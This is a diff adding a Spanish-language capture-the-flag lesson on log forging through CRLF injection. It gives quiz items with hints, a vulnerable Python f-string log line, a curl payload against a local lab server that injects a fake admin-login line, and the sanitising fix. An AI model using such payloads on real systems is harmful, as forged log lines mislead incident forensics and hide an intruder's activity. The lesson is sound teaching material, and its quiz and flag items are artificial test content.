@@ -1,0 +1,66 @@
+---
+index: 1
+title: "CRLF: inyectando líneas falsas"
+questions:
+  - id: log-forging-t01-q01
+    prompt: "¿Qué dos caracteres (en URL-encoded: %0d%0a) marcan el fin de una línea de log y el inicio de otra bajo tu control?"
+    hint: "Carriage Return + Line Feed"
+    kind: text
+  - id: log-forging-t01-q02
+    prompt: "Inyecta una línea que parezca un login exitoso del admin ([SUCCESS] Admin logged in). Envía la flag del logro LOG_FORGED."
+    hint: "curl 'http://127.0.0.1:18102/feedback?msg=hola%0d%0a[SUCCESS]%20Admin%20logged%20in' — usa comillas simples para que bash no toque los corchetes"
+    kind: flag
+  - id: log-forging-t01-q03
+    prompt: "Revisa /logs con curl. ¿Quién aparece como autor de TODAS las líneas de feedback (el nombre que la app pone por defecto)?"
+    hint: "curl -s http://127.0.0.1:18102/logs | head -5"
+    kind: text
+---
+
+## Una línea de log = una mentira potential
+
+La app registra tu feedback así:
+
+```python
+log_line = f'[INFO] User alice said: {msg}'   # ← msg sin sanear
+```
+
+Si `msg` contiene un salto de línea, controlas el inicio de la línea
+siguiente. El navegador y curl envían `%0d%0a` (CR+LF) y el servidor lo
+graba tal cual:
+
+```bash
+curl 'http://127.0.0.1:18102/feedback?msg=hola%0d%0a[SUCCESS]%20Admin%20logged%20in'
+```
+
+El log ahora contiene:
+
+```
+[INFO] User alice said: hola
+[SUCCESS] Admin logged in            ← línea falsa, inyectada por ti
+```
+
+## ¿Por qué importa?
+
+- **Forense envenenado**: tras un incidente real, el analista reconstruye
+  la línea temporal desde los logs. Líneas falsas = culpables falsos y
+  pistas desviadas.
+- **Evasión**: ruidos de "éxito" tapan la operación real del atacante.
+- **Parsers rotos**: los SIEM que indexan línea a línea indexan tu
+  contenido como eventos propios.
+
+Envíalo y reclama la flag, luego mira el resultado:
+
+```bash
+curl -s http://127.0.0.1:18102/logs
+```
+
+## El fix (una línea)
+
+```python
+msg = msg.replace('\r', '').replace('\n', '')   # o mejor: escape de \r\n
+```
+
+Los frameworks serios ya lo hacen: structlog y log4j (configurado con
+`%replace`) ofrecen conversores que neutralizan saltos de línea. El bug
+aparece cuando alguien concatena input directo con `print()` o
+`f-string` al logger.
